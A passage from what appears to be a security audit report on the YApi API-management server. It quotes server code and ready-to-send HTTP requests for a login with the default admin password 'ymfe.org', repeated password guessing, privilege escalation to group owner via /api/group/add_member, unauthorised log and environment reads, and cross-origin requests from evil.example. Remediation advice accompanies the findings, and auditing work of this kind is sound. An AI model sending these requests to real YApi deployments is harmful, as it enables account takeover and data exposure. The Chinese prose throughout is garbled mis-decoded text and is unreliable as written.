  if(tokens && typeof tokens === 'string' && tokens.indexOf('|') > 0){
    tokens = tokens.split('|')
    return {
      uid: tokens[0],
      projectToken: tokens[1]
    }
  }
  return false;
}
```

```40:56:server/controllers/base.js
  let openApiRouter = [
    '/api/open/run_auto_test',
    '/api/open/import_data',
    '/api/interface/add',
    '/api/interface/save',
    '/api/interface/up',
    '/api/interface/get',
    '/api/interface/list',
    '/api/interface/list_menu',
    '/api/interface/add_cat',
    '/api/interface/getCatMenu',
    '/api/interface/list_cat',
    '/api/project/get',
    '/api/plugin/export',
    '/api/project/up',
    '/api/plugin/exportSwagger'
  ];
```

---

#### æ¼æ´ä¸€ï¼šå¼±å¯†ç ç­–ç•¥ä¸é»˜è®¤ç®¡ç†å‘˜å¯†ç ï¼ˆå·²ç¡®è®¤ï¼‰
- ç°çŠ¶ï¼šæ³¨å†Œ/æ”¹å¯†ä»…æ ¡éªŒâ€œéç©ºâ€ï¼Œæ— é•¿åº¦ã€å¤æ‚åº¦ã€å†å²å¯†ç ç­‰é™åˆ¶ï¼›å®‰è£…æ—¶åˆ›å»ºç®¡ç†å‘˜è´¦æˆ·çš„é»˜è®¤å¯†ç ä¸ºå›ºå®šå­—ç¬¦ä¸²ã€‚

è¯æ®ï¼šæ³¨å†Œ/æ”¹å¯†ä»…æ£€æŸ¥éç©º

```313:321:server/controllers/user.js
    if (!params.email) {
      return (ctx.body = yapi.commons.resReturn(null, 400, 'é‚®ç®±ä¸èƒ½ä¸ºç©º'));
    }
    if (!params.password) {
      return (ctx.body = yapi.commons.resReturn(null, 400, 'å¯†ç ä¸èƒ½ä¸ºç©º'));
    }
```

```230:233:server/controllers/user.js
    if (!params.password) {
      return (ctx.body = yapi.commons.resReturn(null, 400, 'å¯†ç ä¸èƒ½ä¸ºç©º'));
    }
```

è¯æ®ï¼šå®‰è£…ç¨‹åºå†…ç½®ç®¡ç†å‘˜é»˜è®¤å£ä»¤

```25:31:server/install.js
  let passsalt = yapi.commons.randStr();
  let result = userInst.save({
    username: yapi.WEBCONFIG.adminAccount.substr(0, yapi.WEBCONFIG.adminAccount.indexOf('@')),
    email: yapi.WEBCONFIG.adminAccount,
    password: yapi.commons.generatePassword('ymfe.org', passsalt),
    passsalt: passsalt,
    role: 'admin',
```

å¯å¤ç° HTTP æ•°æ®åŒ…ï¼ˆé»˜è®¤ç®¡ç†å‘˜å£ä»¤ç™»å½•ï¼‰ï¼š

```
POST /api/user/login HTTP/1.1
Host: target
Content-Type: application/json

{
  "email": "<ADMIN_EMAIL_FROM_CONFIG>",
  "password": "ymfe.org"
}
```

å¯å¤ç° HTTP æ•°æ®åŒ…ï¼ˆå¼±å£ä»¤æ³¨å†Œä¸ç™»å½•ï¼‰ï¼š

```
POST /api/user/reg HTTP/1.1
Host: target
Content-Type: application/json

{
  "email": "weak@example.com",
  "password": "123",
  "username": "weak"
}
```

```
POST /api/user/login HTTP/1.1
Host: target
Content-Type: application/json

{
  "email": "weak@example.com",
  "password": "123"
}
```

ä¿®å¤å»ºè®®ï¼šæ³¨å†Œ/æ”¹å¯†åŠ å…¥ç­–ç•¥æ ¡éªŒï¼ˆé•¿åº¦â‰¥12ã€å­—ç¬¦é›†æ··åˆã€å¸¸è§å£ä»¤é»‘åå•ã€å†å²å¯†ç ç¦æ­¢å¤ç”¨ï¼‰ï¼›å®‰è£…æµç¨‹å¼ºåˆ¶ç®¡ç†å‘˜é¦–æ¬¡ç™»å½•æ”¹å¯†å¹¶ç¦ç”¨é»˜è®¤å¯†ç ã€‚

---

#### æ¼æ´äºŒï¼šç™»å½•æ¥å£ç¼ºå°‘æš´åŠ›ç ´è§£é˜²æŠ¤ï¼ˆå·²ç¡®è®¤ï¼‰
- ç°çŠ¶ï¼š`/api/user/login` ä¸åŒ…å«éªŒè¯ç /IP é™é€Ÿ/å¤±è´¥æ¬¡æ•°é”å®šï¼ŒçŸ­æ—¶é—´å†…å¤šæ¬¡å°è¯•ä¸ä¼šè¢«é˜»æ–­ã€‚

è¯æ®ï¼ˆç™»å½•é€»è¾‘æ— ä»»ä½•é™é€Ÿ/éªŒè¯ç ï¼‰ï¼š

```44:51:server/controllers/user.js
    let result = await userInst.findByEmail(email);
    if (!result) {
      return (ctx.body = yapi.commons.resReturn(null, 404, 'è¯¥ç”¨æˆ·ä¸å­˜åœ¨'));
    } else if (yapi.commons.generatePassword(password, result.passsalt) === result.password) {
      this.setLoginCookie(result._id, result.passsalt);
```

æ”»å‡»å¤ç°ï¼ˆè¿ç»­å°è¯•ä¸åŒå¯†ç ï¼›æ— éªŒè¯ç /é™é€Ÿ/é”å®šï¼‰ï¼š

```
POST /api/user/login HTTP/1.1
Host: target
Content-Type: application/json

{"email":"victim@example.com","password":"guess1"}
```

```
POST /api/user/login HTTP/1.1
Host: target
Content-Type: application/json

{"email":"victim@example.com","password":"guess2"}
```

```
POST /api/user/login HTTP/1.1
Host: target
Content-Type: application/json

{"email":"victim@example.com","password":"guess3"}
```

ä¿®å¤å»ºè®®ï¼šæŒ‰ IP/è´¦å·ç»´åº¦æ¥å…¥é€Ÿç‡é™åˆ¶ä¸å¤±è´¥é”å®šï¼ˆæŒ‡æ•°é€€é¿ã€çŸ­æ—¶é—´å†»ç»“ï¼‰ã€æ”¯æŒéªŒè¯ç ã€äººæœºæ ¡éªŒï¼Œè®°å½•å®¡è®¡æ—¥å¿—ä¸å‘Šè­¦ã€‚

---

#### å®‰å…¨åŸºçº¿é—®é¢˜ï¼šCookie å®‰å…¨å±æ€§ä¸è¶³ï¼ˆå·²ç¡®è®¤ï¼‰
- ç°çŠ¶ï¼šç™»å½•è®¾ç½® Cookie ä»… `httpOnly: true`ï¼Œæœªè®¾ç½® `secure` ä¸ `sameSite`ï¼Œåœ¨ HTTPS åœºæ™¯ä¸‹å­˜åœ¨è¢«è·¨ç«™è¯·æ±‚æºå¸¦çš„é£é™©ã€‚

è¯æ®ï¼š

```274:283:server/controllers/user.js
    this.ctx.cookies.set('_yapi_token', token, {
      expires: yapi.commons.expireDate(7),
      httpOnly: true
    });
    this.ctx.cookies.set('_yapi_uid', uid, {
      expires: yapi.commons.expireDate(7),
      httpOnly: true
    });
```

ä¿®å¤å»ºè®®ï¼šå¼€å¯ HTTPS åè®¾ç½® `secure: true`ï¼Œå¹¶ç»Ÿä¸€è®¾ç½® `sameSite: 'Strict'`ï¼ˆæˆ–æ ¹æ®è·¨åŸŸåœºæ™¯è®¾ç½® Lax/None+Secureï¼‰ï¼Œé™å®š `path` ä¸ `domain`ï¼Œç¼©çŸ­æœ‰æ•ˆæœŸå¹¶åœ¨æ•æ„Ÿæ“ä½œåæ—‹è½¬ Tokenã€‚

---

#### ä¼šè¯å›ºå®šå®¡è®¡ç»“è®ºï¼ˆæ ¸å¿ƒé€»è¾‘ï¼‰
- ç»“è®ºï¼šæ ¸å¿ƒç™»å½•æ€ä¸º JWTï¼Œæ— æœåŠ¡ç«¯ä¼šè¯ï¼›ç™»å½•æ—¶ç­¾å‘å…¨æ–° JWTï¼Œæ”¹å¯†ä¼šæ›´æ¢ `passsalt` å¯¼è‡´æ—§ Token å¤±æ•ˆã€‚æœªå‘ç°ä¼ ç»Ÿâ€œä¼šè¯å›ºå®šâ€å¯åˆ©ç”¨ç‚¹ã€‚

è¡¥å……è¯´æ˜ï¼ˆMock è„šæœ¬/æ’ä»¶åœºæ™¯ï¼‰ï¼šMock ä¸­é—´ä»¶å…è®¸è„šæœ¬/æ’ä»¶é€šè¿‡å“åº”å¤´ä¸‹å‘ `Set-Cookie`ï¼ˆé HttpOnlyï¼‰ï¼Œå¯åœ¨æµè§ˆå™¨ä¾§å†™å…¥ä»»æ„åå€¼ Cookieï¼›è¯¥èƒ½åŠ›é»˜è®¤å…³é—­ï¼ˆéœ€ `project_mock_script` ä¸” `is_mock_open=true` æ‰æ‰§è¡Œï¼‰ï¼Œå±äºâ€œé…ç½®/æ’ä»¶é¢é£é™©â€ï¼Œå»ºè®®ä¸Šçº¿ç¦ç”¨ã€‚

```342:361:server/middleware/mockServer.js
      if (context.resHeader[i] && typeof context.resHeader[i] === 'string') {
        cookie = parseCookie(context.resHeader[i]);
        if (cookie && typeof cookie === 'object') {
          ctx.cookies.set(cookie.name, cookie.value, {
            maxAge: 864000000,
            httpOnly: false
          });
        }
      } else if (context.resHeader[i] && Array.isArray(context.resHeader[i])) {
        context.resHeader[i].forEach(item => {
          cookie = parseCookie(item);
          if (cookie && typeof cookie === 'object') {
            ctx.cookies.set(cookie.name, cookie.value, {
              maxAge: 864000000,
              httpOnly: false
            });
          }
        });
      }
```

---

#### æœªæˆæƒä¸å¼€æ”¾ç«¯ç‚¹æšä¸¾ï¼ˆå·²ç¡®è®¤ï¼‰
- æ— éœ€ç™»å½•ï¼ˆç™½åå•ï¼‰ï¼š

```25:37:server/controllers/base.js
    let ignoreRouter = [
      '/api/user/login_by_token',
      '/api/user/login',
      '/api/user/reg',
      '/api/user/status',
      '/api/user/logout',
      '/api/user/avatar',
      '/api/user/login_by_ldap'
    ];
    if (ignoreRouter.indexOf(ctx.path) > -1) {
      this.$auth = true;
    } else {
      await this.checkLogin(ctx);
    }
```

- OpenAPIï¼ˆå…ç™»å½•ï¼Œéœ€ `token` å‚æ•°ï¼‰ï¼šè§ä¸Šæ–‡ `openApiRouter` åˆ—è¡¨ã€‚

---

#### JWT å®‰å…¨æ£€æŸ¥ç»“è®º
- ä½¿ç”¨ `jsonwebtoken` HS256ï¼ˆé»˜è®¤ï¼‰ä¸ç”¨æˆ· `passsalt` ä½œä¸ºå¯†é’¥ï¼Œéšå¯†ç å˜æ›´è‡ªåŠ¨å¤±æ•ˆï¼›æœªå‘ç°â€œæ— ç­¾åï¼ˆalg=noneï¼‰â€æˆ–è·¨ç”¨æˆ·å¯†é’¥é‡ç”¨é—®é¢˜ã€‚å»ºè®®æ˜¾å¼é™åˆ¶ç®—æ³•é›†ï¼Œå¹¶ç»Ÿä¸€ Token è¿‡æœŸç»­ç­¾ç­–ç•¥ã€‚

---

### ğŸš« **é˜¶æ®µå…­ï¼šæˆæƒä¸è®¿é—®æ§åˆ¶å®¡è®¡** [å·²å®Œæˆ]
**å®¡è®¡èŒƒå›´**ï¼š
- æ°´å¹³è¶Šæƒ
- å‚ç›´è¶Šæƒ
- æƒé™æå‡
- åŠŸèƒ½çº§è®¿é—®æ§åˆ¶ç¼ºå¤±

**ä»»åŠ¡è¦æ±‚**ï¼š
- [x] åˆ†ææ‰€æœ‰éœ€è¦æƒé™çš„æ¥å£
- [x] æµ‹è¯•ä¸åŒæƒé™ç”¨æˆ·çš„è®¿é—®å·®å¼‚
- [x] è¯†åˆ«æ‰€æœ‰å¯èƒ½è¶Šæƒçš„æ•°æ®æ“ä½œç‚¹
- [x] æšä¸¾æ‰€æœ‰è¶Šæƒæ”»å‡»å‘é‡

---

#### æ¼æ´ä¸€ï¼šåˆ†ç»„ä»»æ„åŠ äºº/ææƒï¼ˆå‚ç›´è¶Šæƒï¼Œå·²ç¡®è®¤ï¼‰
- ä½ç½®ä¸æˆå› ï¼š`/api/group/add_member` æœªåšä»»ä½•æƒé™æ ¡éªŒï¼Œä»»æ„ç™»å½•ç”¨æˆ·å¯å°†ä»»æ„ç”¨æˆ·åŠ å…¥ä»»æ„åˆ†ç»„ï¼Œä¸”å¯ç›´æ¥è®¾ä¸º `owner`ã€‚

è¯æ®ï¼š`add_member` æ—  `checkAuth` æ ¡éªŒï¼Œå¯¹ `role` å…è®¸ `owner|dev|guest`ï¼Œå¹¶é”™è¯¯åœ°ä»¥ `userdata.role !== 'admin'` è¿‡æ»¤ï¼ˆæ­¤å¤„ `role` ä¸ºä¼ å…¥ç›®æ ‡è§’è‰²ï¼Œè€Œéç³»ç»Ÿè§’è‰²ï¼‰ï¼Œä¸ä¼šç”Ÿæ•ˆã€‚

```246:266:server/controllers/group.js
  async addMember(ctx) {
    let params = ctx.params;
    let groupInst = yapi.getInst(groupModel);

    params.role = ['owner', 'dev', 'guest'].find(v => v === params.role) || 'dev';
    let add_members = [];
    ...
    let userdata = await this.getUserdata(id, params.role);
    ...
    userdata.role !== 'admin' && add_members.push(userdata);
```

å¯¹ç…§ï¼šåŒæ–‡ä»¶çš„ `change_member_role`ã€`del_member` ä½¿ç”¨äº† `checkAuth(id, 'group', 'danger')`ã€‚

```309:317:server/controllers/group.js
  if ((await this.checkAuth(params.id, 'group', 'danger')) !== true) {
    return (ctx.body = yapi.commons.resReturn(null, 405, 'æ²¡æœ‰æƒé™'));
  }
```

å¯å¤ç° HTTP æ•°æ®åŒ…ï¼ˆå°†è‡ªèº«æ·»åŠ ä¸ºä»»æ„åˆ†ç»„çš„ç»„é•¿ï¼‰ï¼š

```
POST /api/group/add_member HTTP/1.1
Host: target
Content-Type: application/json
Cookie: _yapi_uid=<LOW_PRIV_UID>; _yapi_token=<LOW_PRIV_JWT>

{
  "id": <TARGET_GROUP_ID>,
  "member_uids": [<LOW_PRIV_UID>],
  "role": "owner"
}
```

é¢„æœŸç»“æœï¼šè¿”å›åŒ…å« `add_members` åˆ—è¡¨ï¼Œéšåå¯å¯¹è¯¥åˆ†ç»„åŠå…¶é¡¹ç›®æ‰§è¡Œæ‰€æœ‰â€œå±é™©â€æ“ä½œï¼ˆæ–°å¢/åˆ é™¤æˆå‘˜ã€ä¿®æ”¹é¡¹ç›®ç­‰ï¼‰ã€‚

ä¿®å¤å»ºè®®ï¼šä¸º `/api/group/add_member` è¡¥å…… `checkAuth(id, 'group', 'danger')`ï¼›åŒæ—¶ä¿®æ­£ `userdata.role !== 'admin'` åˆ¤æ–­ï¼Œåº”ä½¿ç”¨ç”¨æˆ·çš„ç³»ç»Ÿè§’è‰²å­—æ®µï¼ˆä¾‹å¦‚ `_role`ï¼‰ã€‚

---

#### æ¼æ´äºŒï¼šé¡¹ç›®/åˆ†ç»„åŠ¨æ€æ—¥å¿—æœªæˆæƒè¯»å–ï¼ˆæ°´å¹³è¶Šæƒï¼Œå·²ç¡®è®¤ï¼‰
- ä½ç½®ä¸æˆå› ï¼š`/api/log/list` ä¸ `/api/log/list_by_update` åœ¨æœåŠ¡ç«¯æœªæ ¡éªŒé¡¹ç›®/åˆ†ç»„å¯è§æ€§æˆ–æˆå‘˜å…³ç³»ï¼Œä»»ä½•ç™»å½•ç”¨æˆ·å¯è¯»å–ä»»æ„ `typeid` çš„åŠ¨æ€åˆ—è¡¨ã€‚

è¯æ®ï¼š`list` å’Œ `list_by_update` å‡æœªè°ƒç”¨ `checkAuth`ã€‚

```42:56:server/controllers/log.js
async list(ctx) {
  let typeid = ctx.request.query.typeid,
      ...
  if (!typeid) { ... }
  if (!type) { ... }
  try {
    if (type === 'group') {
      let projectList = await this.projectModel.list(typeid);
      ...
    } else if (type === "project") {
      let result = await this.Model.listWithPaging(typeid, type, page, limit, selectValue);
```

```107:121:server/controllers/log.js
async listByUpdate(ctx) {
  let { typeid, type, apis } = ctx.params;
  let projectDatas = await this.projectModel.getBaseInfo(typeid, 'basepath');
  ... // æ— æƒé™æ ¡éªŒ
```

å¯å¤ç° HTTP æ•°æ®åŒ…ï¼š

```
GET /api/log/list?type=project&typeid=<TARGET_PROJECT_ID>&page=1&limit=10 HTTP/1.1
Host: target
Cookie: _yapi_uid=<LOW_PRIV_UID>; _yapi_token=<LOW_PRIV_JWT>
```

```
GET /api/log/list?type=group&typeid=<TARGET_GROUP_ID>&page=1&limit=10 HTTP/1.1
Host: target
Cookie: _yapi_uid=<LOW_PRIV_UID>; _yapi_token=<LOW_PRIV_JWT>
```

ä¿®å¤å»ºè®®ï¼š
- `type=project` æ—¶ï¼šè‹¥é¡¹ç›®ä¸º `private`ï¼Œéœ€ `checkAuth(project_id, 'project', 'view')`ï¼›
- `type=group` æ—¶ï¼šéœ€ `checkAuth(group_id, 'group', 'view')` å¹¶ä»…è¿”å›å¯è§é¡¹ç›®çš„æ—¥å¿—ã€‚

---

#### è¯´æ˜ï¼šOpenAPI Token çš„åŠŸèƒ½èŒƒå›´ï¼ˆéæ¼æ´ï¼Œç¡®è®¤è¡Œä¸ºï¼‰
- ä»¥ä¸‹å¼€æ”¾ç«¯ç‚¹åœ¨æä¾› `token` æ—¶å¯æ‰§è¡Œç¼–è¾‘æ“ä½œï¼Œç”¨äºè‡ªåŠ¨åŒ–åŒæ­¥ï¼š

```40:56:server/controllers/base.js
  let openApiRouter = [
    '/api/open/run_auto_test',
    '/api/open/import_data',
    '/api/interface/add',
    '/api/interface/save',
    '/api/interface/up',
    '/api/interface/get',
    '/api/interface/list',
    '/api/interface/list_menu',
    '/api/interface/add_cat',
    '/api/interface/getCatMenu',
    '/api/interface/list_cat',
    '/api/project/get',
    '/api/plugin/export',
    '/api/project/up',
    '/api/plugin/exportSwagger'
  ];
```

- `interface.add/save/up` åœ¨ `this.$tokenAuth === true` æ—¶ä¸å†æ‰§è¡Œ `checkAuth`ï¼Œç¬¦åˆâ€œé¡¹ç›®ä»¤ç‰Œå¯ç¼–è¾‘â€çš„è®¾è®¡ï¼›å»ºè®®åŠ å¼ºä»¤ç‰Œç®¡ç†ï¼ˆæœ€å°åŒ–æš´éœ²ã€å®šæœŸè½®æ¢ã€æ³„æ¼å‘Šè­¦ï¼‰ã€‚

---

### âš™ **é˜¶æ®µä¸ƒï¼šé…ç½®ä¸ç»„ä»¶å®‰å…¨å®¡è®¡** [å·²å®Œæˆ]
**å®¡è®¡èŒƒå›´**ï¼š
- æ•æ„Ÿä¿¡æ¯æ³„éœ²
- CORSé…ç½®é”™è¯¯
- è°ƒè¯•æ¨¡å¼å¼€å¯
- ä¸å®‰å…¨ååºåˆ—åŒ–
- ç¬¬ä¸‰æ–¹ç»„ä»¶æ¼æ´

**ä»»åŠ¡è¦æ±‚**ï¼š
- [x] æ£€æŸ¥æ‰€æœ‰é…ç½®æ–‡ä»¶
- [x] åˆ†æä¾èµ–ç»„ä»¶å®‰å…¨çŠ¶å†µ
- [x] è¯†åˆ«ä¿¡æ¯æ³„éœ²ç‚¹
- [x] æä¾›ç»„ä»¶å‡çº§å»ºè®®

---

#### é…ç½®æ–‡ä»¶ä¸æ•æ„Ÿå­—æ®µæ˜ å°„ï¼ˆä»£ç è¯æ®ï¼‰
- åŠ è½½ä½ç½®ï¼šæœåŠ¡ç«¯è‡ªæ ¹ç›®å½•è¯»å– `config.json` å¹¶ç»‘å®šåˆ°å…¨å±€ `yapi.WEBCONFIG`ã€‚

```4:14:server/yapi.js
const config = require('../../config.json');
...
const WEBCONFIG = config;
```

- å…³é”®å­—æ®µä½¿ç”¨ç‚¹ï¼ˆèŠ‚é€‰ï¼‰ï¼š
  - `mail.*`ï¼šSMTP å‘é€é…ç½®ã€‚

```17:19:server/yapi.js
if (WEBCONFIG.mail && WEBCONFIG.mail.enable) {
  mail = nodemailer.createTransport(WEBCONFIG.mail);
}
```

  - `ldapLogin.*`ï¼šLDAP ç™»å½•ç›¸å…³å­—æ®µï¼ˆæœåŠ¡ç«¯è¯»å–å¹¶æ„é€ æŸ¥è¯¢ï¼‰ã€‚

```7:10:server/utils/ldap.js
  return new Promise((resolve, reject) => {
    const { ldapLogin } = yapi.WEBCONFIG;
```

```139:147:server/controllers/user.js
const { info: ldapInfo } = await ldap.ldapQuery(email, password);
const emailPrefix = email.split(/\@/g)[0];
const emailPostfix = yapi.WEBCONFIG.ldapLogin.emailPostfix;
const emailParams = ldapInfo[yapi.WEBCONFIG.ldapLogin.emailKey || 'mail'] || (emailPostfix ? emailPrefix + emailPostfix : email);
const username = ldapInfo[yapi.WEBCONFIG.ldapLogin.usernameKey] || emailPrefix;
```

  - `closeRegister`ï¼šå…³é—­æ³¨å†Œã€‚

```299:303:server/controllers/user.js
if (yapi.WEBCONFIG.closeRegister) {
  return (ctx.body = yapi.commons.resReturn(null, 400, 'ç¦æ­¢æ³¨å†Œï¼Œè¯·è”ç³»ç®¡ç†å‘˜'));
}
```

  - `plugins`ï¼šæŒ‰é…ç½®åŠ¨æ€åŠ è½½æ’ä»¶ã€‚

```235:237:server/plugin.js
let pluginsConfig = initPlugins(yapi.WEBCONFIG.plugins, 'plugin');
pluginsConfig.forEach(plugin => {
```

  - `port/timeout`ï¼šæœåŠ¡ç›‘å¬ç«¯å£ä¸è¶…æ—¶ã€‚

```61:68:server/app.js
const server = app.listen(yapi.WEBCONFIG.port);
server.setTimeout(yapi.WEBCONFIG.timeout);
```

---

#### å‘ç°ä¸€ï¼šé¡¹ç›®ç¯å¢ƒé…ç½®æœªæˆæƒæ³„éœ²ï¼ˆå·²ç¡®è®¤ï¼‰
- ä½ç½®ä¸æˆå› ï¼š`/api/project/get_env` è¿”å›æŒ‡å®šé¡¹ç›®çš„ç¯å¢ƒé…ç½®ï¼ˆåŸŸåç­‰ï¼‰ï¼ŒæœåŠ¡ç«¯æ³¨é‡Šæ‰æƒé™æ ¡éªŒï¼Œä»»æ„ç™»å½•ç”¨æˆ·å¯è¯»å–ä»»æ„é¡¹ç›®çš„ç¯å¢ƒåŸŸåä¿¡æ¯ã€‚

```971:978:server/controllers/project.js
// å»æ‰æƒé™åˆ¤æ–­
// if ((await this.checkAuth(project_id, 'project', 'edit')) !== true) {
//   return (ctx.body = yapi.commons.resReturn(null, 405, 'æ²¡æœ‰æƒé™'));
// }
let env = await this.Model.getByEnv(project_id);
```

å¯å¤ç° HTTP æ•°æ®åŒ…ï¼š

```
GET /api/project/get_env?project_id=<TARGET_PROJECT_ID> HTTP/1.1
Host: target
Cookie: _yapi_uid=<LOW_PRIV_UID>; _yapi_token=<LOW_PRIV_JWT>
```

é¢„æœŸç»“æœï¼šè¿”å›å¯¹è±¡æ•°ç»„ï¼ŒåŒ…å«ç›®æ ‡é¡¹ç›®çš„ç¯å¢ƒåç§°ä¸åŸŸåï¼ˆå¦‚ `http://intranet.example`ï¼‰ã€‚

ä¿®å¤å»ºè®®ï¼šæ¢å¤æƒé™æ ¡éªŒï¼Œè‡³å°‘è¦æ±‚ `checkAuth(project_id, 'project', 'view')`ï¼›å¯¹è¿”å›å€¼è¿›è¡Œæœ€å°åŒ–æš´éœ²ï¼Œé¿å…è¿”å›å†…éƒ¨åŸŸåç­‰æ•æ„Ÿä¿¡æ¯ç»™éæˆå‘˜ã€‚

---

#### å‘ç°äºŒï¼šMock ä¸­é—´ä»¶ CORS åå°„æ”¾è¡Œä¸”å…è®¸å‡­æ®ï¼ˆå·²ç¡®è®¤ï¼‰
- ä½ç½®ä¸æˆå› ï¼š`/mock/*` ä¸­é—´ä»¶å°† `Access-Control-Allow-Origin` è®¾ä¸ºè¯·æ±‚å¤´ `Origin`ï¼Œå¹¶è®¾ç½® `Access-Control-Allow-Credentials: true`ï¼Œæœªè§æ¥æºç™½åå•ã€‚

```161:166:server/middleware/mockServer.js
ctx.set('Access-Control-Allow-Origin', header.origin);
ctx.set('Access-Control-Allow-Credentials', true);
// ctx.set('Access-Control-Allow-Origin', '*');
```

```80:88:server/middleware/mockServer.js
function handleCorsRequest(ctx) {
  let header = ctx.request.header;
  ctx.set('Access-Control-Allow-Origin', header.origin);
  ctx.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, HEADER, PATCH, OPTIONS');
  ctx.set('Access-Control-Allow-Headers', header['access-control-request-headers']);
  ctx.set('Access-Control-Allow-Credentials', true);
  ctx.set('Access-Control-Max-Age', 1728000);
  ctx.body = 'ok';
}
```

å¯å¤ç° HTTP æ•°æ®åŒ…ï¼ˆé¢„æ£€å³å¯è¯æ˜è·¨åŸŸæ”¾è¡Œï¼‰ï¼š

```
OPTIONS /mock/<PROJECT_ID>/nonexistent HTTP/1.1
Host: target
Origin: https://evil.example
Access-Control-Request-Method: GET
Access-Control-Request-Headers: X-Requested-With, Content-Type
```

å¯å¤ç° HTTP æ•°æ®åŒ…ï¼ˆè·¨åŸŸè¯»å–ç¤ºä¾‹ï¼Œéœ€æµè§ˆå™¨å‘èµ·æ—¶è®¾ç½® credentials: includeï¼‰ï¼š

```
GET /mock/<PROJECT_ID>/<PROJECT_BASEPATH+INTERFACE_PATH> HTTP/1.1
Host: target
Origin: https://evil.example
Cookie: _yapi_uid=<UID>; _yapi_token=<JWT>
```

ä¿®å¤å»ºè®®ï¼š
- `/mock/*` å¢åŠ å…è®¸åŸŸç™½åå•ï¼›ä»…å¯¹å—ä¿¡ä»»åŸŸåå°„ `Origin`ï¼›
- è¯„ä¼°æ˜¯å¦éœ€è¦ `Access-Control-Allow-Credentials: true`ï¼›å¦‚éœ€ï¼ŒåŠ¡å¿…ä¸ç²¾å‡†ç™½åå•åŒæ—¶ä½¿ç”¨ï¼›
- å¯¹ç§æœ‰é¡¹ç›®ï¼ˆ`project_type=private`ï¼‰çš„ Mock å“åº”é™„åŠ æˆå‘˜å¯è§æ€§æ ¡éªŒã€‚

è¯´æ˜ï¼š`/api/test/response` å•ä¸€è°ƒè¯•ç«¯ç‚¹è®¾ç½® `Access-Control-Allow-Origin: *`ï¼Œä½†å—ç™»å½•æ ¡éªŒé™åˆ¶ï¼Œé£é™©è¾ƒä½ã€‚

```227:235:server/controllers/test.js
let result = { b: '12', c: '23' };
ctx.set('Access-Control-Allow-Origin', '*');
ctx.set('Content-Type', 'text');
```

---

#### ä¸å®‰å…¨ååºåˆ—åŒ–æ£€æŸ¥ï¼ˆç»“è®ºï¼‰
- ç»“è®ºï¼šæœåŠ¡ç«¯æœªä½¿ç”¨ `node-serialize`/`deserialize` ç­‰å±é™©ååºåˆ—åŒ–åº“ï¼›ç»“æ„è§£æä¸»è¦ä¸º `JSON.parse`/`json5.parse`ã€‚æœªå‘ç°å°†ä¸å—ä¿¡ä»»æ•°æ®ä¼ å…¥ååºåˆ—åŒ–æ‰§è¡Œé“¾å¯¼è‡´ä»£ç æ‰§è¡Œçš„è·¯å¾„ã€‚

è¡¥å……ï¼š`json5` ç”¨äºè§£ææ¥å£/Mock/Schema ç­‰ç”¨æˆ·å¯æ§æ–‡æœ¬ï¼Œç‰ˆæœ¬è¾ƒæ—§ï¼ˆè§ä¸‹èŠ‚ä¾èµ–æ¸…å•ï¼‰ï¼Œå»ºè®®å‡çº§å¹¶é™åˆ¶è¾“å…¥å¤§å°ä¸è§£æè¶…æ—¶ã€‚

---

#### ä¾èµ–ç»„ä»¶å®‰å…¨çŠ¶å†µä¸å‡çº§å»ºè®®ï¼ˆåŸºäº package.jsonï¼‰
- å‘ç°ï¼šå…³é”®è¿è¡Œæ—¶ä¾èµ–ç‰ˆæœ¬è¾ƒæ—§ï¼Œä¸”å­˜åœ¨å·²å¼ƒç”¨åº“ï¼›å»ºè®®ç»Ÿä¸€å‡çº§å¹¶æ‰§è¡Œå®‰å…¨å®¡è®¡ã€‚

è¯æ®ï¼ˆèŠ‚é€‰ï¼‰ï¼š

```33:60:package.json
"dependencies": {
  "axios": "0.18.1",
  "jsonwebtoken": "7.4.1",
  "koa": "2.0.0",
  "mongoose": "5.7.5",
  "json5": "0.5.1",
  "underscore": "1.8.3",
  "request": "2.81.0",
  ...
}
```

å‡çº§å»ºè®®ï¼ˆä¸æ”¹å˜è¯­ä¹‰å‰æä¸‹çš„æ–¹å‘æ€§å»ºè®®ï¼‰ï¼š
- ç»Ÿä¸€å‡çº§è‡³å—æ”¯æŒçš„å¤§ç‰ˆæœ¬ï¼š`axios ^1.x`ã€`jsonwebtoken ^9.x`ã€`mongoose ^7/8`ã€`koa ^2.14+`ã€`underscore >=1.13.6`ã€`json5 >=2.2.x`ï¼›
- ç”¨ `undici`/`node-fetch` æ›¿ä»£å·²å¼ƒç”¨çš„ `request`ï¼›
- å‰åç«¯åˆ†åˆ«æ‰§è¡Œå¹¶ä¿®å¤ `npm audit --production` ä¸ `npm outdated` è¾“å‡ºï¼›
- å¯¹è§£æç±»ä¾èµ–ï¼ˆå¦‚ `json5`ï¼‰é™åˆ¶è¾“å…¥ä½“ç§¯ä¸è§£æè¶…æ—¶ï¼›å¯¹ç½‘ç»œç±»ä¾èµ–ï¼ˆå¦‚ `axios`ï¼‰ç»Ÿä¸€è®¾ç½® `timeout`ã€é‡å®šå‘ä¸Šé™ä¸åŸŸå/IP ç™½åå•ã€‚

---

### ğŸ“ **é˜¶æ®µå…«ï¼šæ–‡ä»¶æ“ä½œå®‰å…¨å®¡è®¡** [å·²å®Œæˆ]
**å®¡è®¡èŒƒå›´**ï¼š
- ä»»æ„æ–‡ä»¶ä¸Šä¼ 
- ä»»æ„æ–‡ä»¶ä¸‹è½½/è¯»å–
- è·¯å¾„éå†
- æ–‡ä»¶åŒ…å«æ¼æ´

 **ä»»åŠ¡è¦æ±‚**ï¼š
 - [x] åˆ†ææ‰€æœ‰æ–‡ä»¶æ“ä½œåŠŸèƒ½
 - [x] æ£€æŸ¥æ–‡ä»¶ç±»å‹éªŒè¯æœºåˆ¶
 - [x] è¯†åˆ«è·¯å¾„æ‹¼æ¥æ“ä½œ
 - [x] æšä¸¾æ‰€æœ‰æ–‡ä»¶ç›¸å…³æ”»å‡»ç«¯ç‚¹

---

#### æ–‡ä»¶æ“ä½œç«¯ç‚¹æ€»è§ˆï¼ˆä»£ç è¯æ®ï¼‰
- ä¸Šä¼ ç±»ï¼š

```536:548:server/router.js
  test: {
    prefix: '/test/',
    controller: testController
  },
  ...
  {
    action: 'testFilesUpload',
    path: 'files/upload',
    method: 'post'
  },
  {
    action: 'testSingleUpload',
    path: 'single/upload',
    method: 'post'
  },
```

```546:585:server/controllers/user.js
/** ä¸Šä¼ ç”¨æˆ·å¤´åƒ */
async uploadAvatar(ctx) {
  let basecode = ctx.request.body.basecode;
  if (!basecode) return (ctx.body = yapi.commons.resReturn(null, 400, 'basecodeä¸èƒ½ä¸ºç©º'));
  let pngPrefix = 'data:image/png;base64,';
